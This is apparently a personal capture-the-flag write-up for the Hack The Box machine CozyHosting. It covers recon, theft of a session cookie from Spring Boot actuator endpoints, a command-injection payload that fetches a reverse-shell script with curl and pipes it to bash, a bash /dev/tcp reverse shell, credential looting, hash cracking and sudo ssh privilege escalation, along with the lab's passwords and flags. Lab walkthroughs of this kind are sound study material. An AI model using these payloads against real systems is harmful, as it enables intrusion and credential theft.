---
title: "CozyHosting from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# CozyHosting from HTB
[page](https://app.hackthebox.com/machines/CozyHosting)
`Nmap` gave this:
```bash
nmap -sCV --min-rate 4000 10.10.11.230
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 18:47 +04
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.093s latency).
Not shown: 919 filtered tcp ports (no-response), 79 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home

```
Nothing Unusual.
Added this to `/etc/hosts`:
```
10.10.11.230 cozyhosting.htb
```
Got to the site and used `Gobuster`:
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://cozyhosting.htb/

/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
```
Accessing all the directories gave me nothing except `error`one which said:
```
# Whitelabel Error Page
```
Researching this will get you to `Springboot`. To list all the directories you can use the `spring-boot.txt wordlist`:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 106ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 119ms]
actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 154ms]
actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 170ms]
actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 160ms]
actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 190ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 175ms]
actuator/sessions       [Status: 200, Size: 148, Words: 1, Lines: 1, Duration: 175ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 180ms]
```
In `actuator/sessions`I found `cookie for kanderson`:
```
"68BCAFEDE95BEB075339B14CF851D8B3": "kanderson"
```
I inserted the `cookie`into `cookie editor`or you can insert it with `inspect`:
```
JSESSIONID: 68BCAFEDE95BEB075339B14CF851D8B3
```
The cookie will be different each time.
Then went to `/admin`directory and i was logged as `K.Anderson`
```
#### Please note

For Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorised_keys file.
```
This tells me that this:
![](/assets/images/Screenshot from 2024-08-09 18-58-20.png)
Is an code that is associated with `ssh`.
Create an `reverse shell`bash script and then start the `simple python3 server`:
```bash
 echo -e '#!/bin/bash\nsh -i >& /dev/tcp/<your_ip>/<port> 0>&1' > reverse.sh
 python3 -m http.server 8000
```
Then run this script on the site:
```bash
127.0.0.1
test;curl${IFS}http://<your_ip>:<port>/reverse.sh|bash;
```
Before you press `submit` start `NetCat listener on port` that you typed in the `reverse.sh`file.
Then press `submit`and you should get connection:
```bash
$ rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.230] 51272
sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
app@cozyhosting:/app$ ls
cloudhosting-0.0.1.jar
$ unzip -d /tmp/app cloudhosting-0.0.1.jar
```
This will unzip the `.jar`file into `tmp/app`directory. Go to that directory and search for the password and username.
```bash
app@cozyhosting:/tmp/app/BOOT-INF/classes$ cat app
cat application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxRapp@cozyhosting:/tmp/app/BOOT-INF/classes
```
`psql`database is running locally and to access that `db`you will need the credentials that's listed in this file
***
Username --- postgres
Password --- Vg&nvzAQ7XxR
***
Connect to the database and search for `users`to get the password.
```sql
psql -h 127.0.0.1 -U postgres
Password for user postgres: Vg&nvzAQ7XxR
postgres-# \list
\list
WARNING: terminal is not fully functional
Press RETURN to continue

                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
eges
-------------+----------+----------+-------------+-------------+----------------
-------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres
      +
             |          |          |             |             | postgres=CTc/po
stgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres
      +
             |          |          |             |             | postgres=CTc/po
stgres
```
The database that seems interesting is `cozyhosting`.
```sql
\connect cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
\dt
WARNING: terminal is not fully functional
Press RETURN to continue

         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres

select * from users;
WARNING: terminal is not fully functional
Press RETURN to continue

   name    |                           password                           | role

-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```
`Kanderson's password`is not interesting to us because he is not listed in `/etc/passwd`but `josh`is listed and `admin password`is for `josh`. Identify it with `hashid`and then `decrypt`it with `hashcat`:
```bash
hashcat hash -m 3200 /usr/share/wordlists/rockyou.txt
..............
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
..............
```
Then go to `ssh`and connect as `josh`with password `manchesterunited`:
```bash
 ssh josh@10.10.11.230
 josh@10.10.11.230's password: manchesterunited
```
You can get the `uset.txt`:
```bash
josh@cozyhosting:~$ ls
user.txt
josh@cozyhosting:~$ cat user.txt
e6db96f4c67b39fc016f562b86690bb2
```
***
User Flag is: e6db96f4c67b39fc016f562b86690bb2
***
Then learn what you can do with `root permission`:
```bash
sudo -l
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```
Then i searched `ssh privilege escalation`and i found this command on `GTFObins`:
https://gtfobins.github.io/gtfobins/ssh/
```
ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/sh' host
```
The final command will look like this:
```
sudo /usr/bin/ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/sh' josh@127.0.0.1
```
Enter the password for `josh`and you will become the root.
***
Root Flag is: c583c160768d95a1198e21666cbf4b54
***
![](/assets/images/Screenshot from 2024-08-09 18-45-40.png)
